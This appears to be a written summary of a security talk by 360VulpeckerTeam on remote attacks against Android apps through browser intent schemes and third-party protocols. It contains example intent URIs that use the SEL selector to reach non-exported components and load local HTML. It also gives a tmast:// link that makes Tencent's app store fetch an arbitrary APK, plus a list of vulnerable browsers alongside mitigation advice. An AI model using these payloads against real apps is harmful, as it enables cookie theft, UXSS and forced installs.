### 细数安卓APP远程攻击漏洞

**演讲者简介**
- **微博**: @0xr0ot, @z7sky
- **成员**: z7sky & 行之
- **团队**: 360VulpeckerTeam
- **研究方向**: Android系统安全和第三方应用安全

#### 概览
在2013年的Mobile Pwn2Own大赛中，安全研究人员Pinkie Pie利用了Chrome浏览器的两个零日漏洞，实现了远程代码执行攻击，通过远程网页控制了系统。随后，在2014年，日本安全研究人员Takeshi Terada公布了Pwn2Own大赛中intent协议漏洞的利用方法。

#### 影响面最大的远程攻击入口
**意图协议和第三方协议**

##### 协议漏洞
**Intent协议漏洞**
- 在Chrome v18及更早版本中，可以通过为iframe的src属性设置自定义scheme来从Web页面启动一个本地应用。其他Android浏览器也支持这一功能。
- 自Chrome v25起，这种机制有所变化，改用自定义scheme或“intent:”来实现。

**Intent Scheme URL处理步骤**
1. 使用`Intent.parseUri(uri)`解析URL生成intent对象。
2. 对intent对象进行过滤（不同浏览器有不同的过滤规则）。
3. 通过`Context#startActivityIfNeeded()`或`Context#startActivity()`传递经过过滤后的intent以启动activity。

示例：
```plaintext
intent:mydata#Intent;action=com.me.om;S.url=file:///mnt/sdcard/Download/xss.html;SEL;component=com.ex.uritest/com.ex.uritest.MainActivity;end
```
如果intent无法被解析或外部应用不能被启动，用户将被重定向到备用页面：
```plaintext
S.browser_fallback_url=[encoded_full_url]
```

##### BROWSABLE Category
- `android.intent.category.BROWSABLE`：配置在`AndroidManifest.xml`文件中，表明该组件可以通过浏览器安全打开，不会对应用自身造成危害。建议对于脆弱或包含重要业务逻辑的应用组件禁用此属性。

##### Selector Intent
- Android API level 15 (Android 4.0.3) 引入了Selector intent机制。若main intent拥有selector intent，Android Framework会解析selector intent。
- 示例：
  ```plaintext
  intent://appscan#Intent;S.url=file:///mnt/sdcard/Download/xss.html;SEL;component=com.ex.uritest/com.ex.uritest.MainActivity;end
  ```
- 利用SEL特性可以绕过某些安全限制：
  ```java
  Intent intent = Intent.parseUri(uri);
  intent.addCategory("android.intent.category.BROWSABLE");
  intent.setComponent(null);
  context.startActivityIfNeeded(intent, -1);
  ```

#### 攻击场景
- **Cookie Theft & UXSS**：通过浏览器攻击其他应用及未导出组件。
  - **案例**：攻击小米商城应用的`com.xiaomi.shop.activity.MainActivity`组件。
  - **防御**：避免使用`addJavascriptInterface()`，移除系统接口并动态加载JS。

- **Webview RCE**：详见[此处](http://security.360.cn/Index/news/id/59.html)。

#### 市面上仍受影响的浏览器
| 浏览器 | action | data | extra | component | BROWSABLE | sel |
|--------|--------|------|-------|-----------|-----------|-----|
| 搜狗浏览器 | 支持 | 支持 | 支持 | 不支持 | 需要 | 支持 |
| 猎豹浏览器 | 支持 | 支持 | 支持 | 不支持 | 需要 | 支持 |
| 遨游云浏览器 | 支持 | 支持 | 支持 | 支持 | 不需要 | 支持 |
| 2345浏览器 | 支持 | 支持 | 支持 | 不支持 | 需要 | 支持 |
| 欧朋浏览器 | 支持 | 支持 | 支持 | 支持 | 不需要 | 支持 |
| 海豚浏览器 | 支持 | 支持 | 支持 | 支持 | 不需要 | 支持 |
| Mercury | 支持 | 支持 | 支持 | 支持 | 不需要 | 支持 |

#### 攻击案例
- **视频**：利用猎豹浏览器攻击搜狗输入法。
- **自动检测及利用**：使用Androguard搜索关键函数如`parseUri()`、`loadUrl()`、`addJavascriptInterface()`，结合hook技术实现自动化动态检测及利用。

#### 漏洞缓解方案
- 安全是一个不断攻防对抗的过程。建议开发者采取以下措施：
  - 严格过滤intent对象。
  - 避免使用不安全的API。
  - 动态监控和检测潜在的安全风险。

#### 第三方协议漏洞
- **案例**：腾讯应用宝
  - 示例URL:
    ```plaintext
    tmast://download?downl_biz_id=qb&down_ticket=11&downl_url=https%3A%2f%2fwww.mwrinfosecurity.com%2fsystem%2fassets%2f934%2foriginal%2fdrozer-agent-2.3.4.apk
    ```

通过以上分析，可以得出相对较为安全的intent filter方案。